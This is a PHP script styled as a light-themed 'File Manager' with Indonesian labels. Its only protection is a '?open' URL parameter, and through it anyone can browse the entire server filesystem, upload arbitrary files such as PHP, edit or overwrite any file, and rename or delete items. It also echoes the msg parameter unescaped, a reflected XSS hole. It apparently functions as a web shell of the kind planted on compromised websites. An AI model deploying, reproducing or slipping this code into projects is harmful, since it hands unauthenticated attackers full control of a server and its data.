<?php
/****************************
 * Modern PHP File Manager (Require ?open + Light Mode)
 ****************************/

// === Require query ?open ===
if (!isset($_GET['open'])) {
    http_response_code(403);
    exit("Access blocked");
}

$BASE_START = __DIR__;

function safe_real($p){
    $r = realpath($p);
    return $r !== false ? $r : null;
}

$cwd = isset($_GET['p']) ? $_GET['p'] : $BASE_START;
$cwd = safe_real($cwd) ?: $BASE_START;

$msg = "";

// ===== Actions =====
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
    $a = $_POST['action'];

    if ($a==='upload' && isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $cwd.'/'.basename($_FILES['file']['name']));
        $msg="Upload sukses";
    }

    if ($a==='mkdir' && !empty($_POST['folder'])) {
        @mkdir($cwd.'/'.basename($_POST['folder']));
        $msg="Folder dibuat";
    }

    if ($a==='mkfile' && !empty($_POST['filename'])) {
        $f=$cwd.'/'.basename($_POST['filename']);
        if(!file_exists($f)) file_put_contents($f,"");
        $msg="File dibuat";
    }

    if ($a==='rename') {
        $old=safe_real($cwd.'/'.$_POST['old']);
        $new=$cwd.'/'.basename($_POST['new']);
        if($old) @rename($old,$new);
        $msg="Rename berhasil";
    }

    if ($a==='delete') {
        $t=safe_real($cwd.'/'.$_POST['target']);
        if($t){ is_dir($t)?@rmdir($t):@unlink($t); }
        $msg="Terhapus";
    }

    if ($a==='save') {
        $f=safe_real($cwd.'/'.$_POST['file']);
        if($f && is_file($f)) file_put_contents($f,$_POST['content']);
        $msg="Disimpan";
    }

    header("Location: ?open&p=".urlencode($cwd)."&msg=".urlencode($msg));
    exit;
}

$editFile=null;
if(isset($_GET['edit'])){
    $ep=safe_real($cwd.'/'.$_GET['edit']);
    if($ep && is_file($ep)) $editFile=$ep;
}

$items=scandir($cwd);

function breadcrumb($path){
    $parts=explode('/',trim($path,'/'));
    $acc=''; $links=[];
    foreach($parts as $p){
        if($p==='') continue;
        $acc.='/'.$p;
        $links[]=['name'=>$p,'path'=>$acc];
    }
    return $links;
}
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>File Manager</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">
<style>
/* ===== LIGHT THEME (WHITE BACKGROUND) ===== */
:root{
 --bg:#ffffff;
 --card:#ffffff;
 --card2:#fafafa;
 --text:#212529;
 --muted:#6c757d;
 --border:#e2e6ea;
 --tbl:#f1f3f5;
 --hover:#f5f7fb;
}

body{
 background:var(--bg);
 color:var(--text);
 font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

.card-modern{
 border-radius:12px;
 background:var(--card);
 border:1px solid var(--border);
 box-shadow:0 4px 10px rgba(0,0,0,0.06);
}

.table{color:var(--text);}
.table thead{
 background:var(--tbl);
 border-bottom:1px solid var(--border);
}
.table tbody tr{background:var(--card2);transition:background .15s;}
.table tbody tr:hover{background:var(--hover);}
.table tbody tr+tr{border-top:1px solid var(--border);}

.badge-folder{
 background:#e7f1ff;
 color:#0d6efd;
 border-radius:6px;
 padding:4px 8px;
}
.badge-file{
 background:#eef0f2;
 color:#495057;
 border-radius:6px;
 padding:4px 8px;
}

input,textarea{
 background:#ffffff!important;
 color:#212529!important;
 border:1px solid #ced4da!important;
 border-radius:6px;
}

.btn-dark{
 background:#343a40!important;
 border-color:#343a40!important;
 color:#fff!important;
}

.btn-xs{
 padding:0.2rem 0.4rem;
 font-size:0.75rem;
 line-height:1.2;
 border-radius:4px;
}

a{color:#0d6efd;text-decoration:none;}
a:hover{color:#0a58ca;text-decoration:underline;}

textarea{font-family:'Courier New', monospace;}

.form-control:focus{
 box-shadow:0 0 0 0.2rem rgba(13,110,253,.25);
}

.btn{border-radius:6px;}
.alert{border-radius:8px;}
</style>
</head>
<body>
<div class="container-fluid px-3 py-3">

  <div class="mb-4">
    <h2 class="fw-bold mb-1 text-primary"><i class="bi bi-folder-fill me-2"></i>File Manager</h2>
    <p class="text-muted small mb-0">Light • Minimal • Clean</p>
  </div>

  <?php if(isset($_GET['msg'])): ?>
  <div class="alert alert-success card-modern shadow-sm mb-3 fade show">
    <i class="bi bi-check-circle-fill me-2"></i><?=$_GET['msg']?>
  </div>
  <?php endif; ?>

  <!-- Breadcrumb and Actions -->
  <div class="card card-modern shadow-sm mb-4">
    <div class="card-body p-3">
      <div class="row g-3">
        <div class="col-md-6">
          <strong class="text-secondary small">Path:</strong>
          <nav aria-label="breadcrumb" class="d-inline">
            <ol class="breadcrumb bg-transparent p-0 m-0">
              <li class="breadcrumb-item"><a href="?open&p=/"><i class="bi bi-house-door"></i></a></li>
              <?php foreach(breadcrumb($cwd) as $b): ?>
                <li class="breadcrumb-item"><a href="?open&p=<?=urlencode($b['path'])?>"><?=$b['name']?></a></li>
              <?php endforeach; ?>
            </ol>
          </nav>
        </div>

        <div class="col-md-6">
          <div class="d-flex flex-wrap gap-2 justify-content-end">
            <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
              <input type="hidden" name="action" value="upload">
              <input type="file" name="file" class="form-control form-control-sm" required>
              <button class="btn btn-primary btn-sm"><i class="bi bi-upload me-1"></i>Upload</button>
            </form>

            <form method="post" class="d-flex gap-2">
              <input type="hidden" name="action" value="mkdir">
              <input type="text" name="folder" placeholder="New folder" class="form-control form-control-sm">
              <button class="btn btn-success btn-sm"><i class="bi bi-folder-plus me-1"></i>Create</button>
            </form>

            <form method="post" class="d-flex gap-2">
              <input type="hidden" name="action" value="mkfile">
              <input type="text" name="filename" placeholder="New file" class="form-control form-control-sm">
              <button class="btn btn-info btn-sm"><i class="bi bi-file-earmark-plus me-1"></i>Create</button>
            </form>
          </div>
        </div>

      </div>
    </div>
  </div>

  <?php if($editFile): ?>
  <div class="card card-modern shadow-sm mb-4">
    <div class="card-header bg-transparent fw-semibold border-bottom border-secondary">
      <i class="bi bi-pencil-square me-2"></i>Edit — <?=basename($editFile)?>
    </div>
    <div class="card-body p-3">
      <form method="post">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="file" value="<?=htmlspecialchars($_GET['edit'])?>">
        <textarea rows="15" name="content" class="form-control mb-3"><?=htmlspecialchars(file_get_contents($editFile))?></textarea>
        <div class="d-flex gap-2">
          <button class="btn btn-primary"><i class="bi bi-save me-1"></i>Simpan</button>
          <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-dark"><i class="bi bi-x-circle me-1"></i>Batal</a>
        </div>
      </form>
    </div>
  </div>
  <?php endif; ?>

  <div class="card card-modern shadow-sm">
    <div class="table-responsive">
      <table class="table table-hover mb-0">
        <thead>
        <tr>
          <th class="ps-3"><i class="bi bi-file-earmark me-1"></i>Nama</th>
          <th>Tipe</th>
          <th>Ukuran</th>
          <th class="text-end pe-3">Aksi</th>
        </tr>
        </thead>
        <tbody>
        <?php foreach($items as $it):
          if($it==='.') continue;
          $full=safe_real($cwd.'/'.$it);
          if(!$full) continue;
          $isDir=is_dir($full);
        ?>
        <tr>
          <td class="fw-medium ps-3">
            <?php if($isDir): ?>
              <span class="badge badge-folder me-2"><i class="bi bi-folder"></i></span>
              <a href="?open&p=<?=urlencode($full)?>"><?=$it?></a>
            <?php else: ?>
              <span class="badge badge-file me-2"><i class="bi bi-file-earmark"></i></span>
              <?=$it?>
            <?php endif; ?>
          </td>
          <td><?=$isDir?'Folder':'File'?></td>
          <td><?=$isDir?'—':number_format(filesize($full)).' bytes'?></td>
          <td class="text-end pe-3">
            <div class="d-flex gap-1 justify-content-end flex-wrap">
              <?php if(!$isDir): ?>
                <a class="btn btn-primary btn-xs" href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>"><i class="bi bi-pencil"></i> Edit</a>
              <?php endif; ?>

              <form method="post" class="d-inline" onsubmit="return confirm('Hapus item ini?')">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="target" value="<?=htmlspecialchars($it)?>">
                <button class="btn btn-danger btn-xs"><i class="bi bi-trash"></i> Delete</button>
              </form>

              <form method="post" class="d-inline d-flex gap-1">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old" value="<?=htmlspecialchars($it)?>">
                <input type="text" name="new" class="form-control form-control-sm" placeholder="rename" style="width:100px;">
                <button class="btn btn-dark btn-xs"><i class="bi bi-check"></i></button>
              </form>
            </div>
          </td>
        </tr>
        <?php endforeach;?>
        </tbody>
      </table>
    </div>
  </div>

</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
